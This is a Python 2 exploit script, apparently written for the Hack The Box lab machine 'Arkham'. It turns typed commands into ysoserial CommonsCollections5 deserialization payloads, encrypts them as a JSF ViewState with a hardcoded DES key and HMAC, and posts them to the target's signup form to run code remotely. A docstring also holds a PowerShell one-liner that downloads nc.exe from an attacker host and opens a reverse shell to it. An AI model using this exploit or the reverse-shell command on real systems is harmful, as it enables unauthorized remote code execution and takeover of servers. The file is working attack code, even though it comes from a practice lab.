#!/usr/bin/python
import base64, hmac, hashlib, os, urllib
from Crypto.Cipher import DES
from sys import exit
import requests

def main():
	original = "wHo0wmLu5ceItIi+I7XkEi1GAb4h12WZ894pA+Z4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE="
	secret = "SnNGOTg3Ni0="
	cookie = sessionid()

	#vs = decrypt_viewstate(original,secret)

	"""
	powershell Invoke-WebRequest -Uri "http://10.10.15.22:8080/nc.exe" -OutFile nc.exe; nc.exe 10.10.15.22 9191 -e cmd.exe
	"""

	try:
		while True:
			cmd = raw_input("> ")
			prep = """java -jar ysoserial.jar CommonsCollections5 %r > payload.bin""" % cmd
			print prep
			os.system(prep)

			with open('payload.bin','r') as f:
				p = f.read()
				f.close()

			malvs = encrypt_viewstate(p, secret).encode('ascii')
			deliver(malvs,cookie)

	except KeyboardInterrupt:
		exit()

def deliver(malvs,cookie):
	headers = {
	    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0',
	    'Content-Type': 'application/x-www-form-urlencoded',
	}

	data = 'j_id_jsp_1623871077_1%3Aemail=root%40cyclone.com&j_id_jsp_1623871077_1%3Asubmit=SIGN+UP&j_id_jsp_1623871077_1_SUBMIT=1&javax.faces.ViewState={}'.format(malvs)

	requests.post('http://arkham.htb:8080/userSubscribe.faces', headers=headers, cookies=cookie, data=data, verify=False)

def sessionid():
    with requests.Session() as s:
        s.get('http://10.10.10.130:8080/userSubscribe.faces', verify=False)
        JSESSIONID = {'JSESSIONID': requests.utils.dict_from_cookiejar(s.cookies)['JSESSIONID']}
        return JSESSIONID

def encrypt_viewstate(viewstate, secret):
	secret = base64.b64decode(secret)
	des = DES.new(secret, DES.MODE_ECB)

	viewstate = padding_append(viewstate)
	viewstate = [viewstate[n:n+8] for n in xrange(0, len(viewstate), 8)]
	viewstate = "".join(map(des.encrypt, viewstate))
	viewstate += hmac.new(secret, viewstate, hashlib.sha1).digest()
	viewstate = base64.b64encode(viewstate)

	return urllib.quote(viewstate)

def decrypt_viewstate(viewstate, secret):
	secret = base64.b64decode(secret)
	des = DES.new(secret, DES.MODE_ECB)

	viewstate = base64.b64decode(viewstate)[:-20]
	viewstate = [viewstate[n:n+8] for n in xrange(0, len(viewstate), 8)]
	viewstate = "".join(map(des.decrypt, viewstate))
	viewstate = padding_remove(viewstate)

	return urllib.quote(viewstate)

def padding_append(data):
	if len(data) % 8:
		for n in xrange(len(data)):
			if ((len(data) + n) % 8) == 0:
				data += chr(n) * n
				break

	return data

def padding_remove(data):
	data = map(ord, data)
	padv = data[-1]

	if data[-padv:] == [padv,] * padv:
		data = data[:-padv]

	return "".join(map(chr, data))

if __name__ == '__main__':
    main()
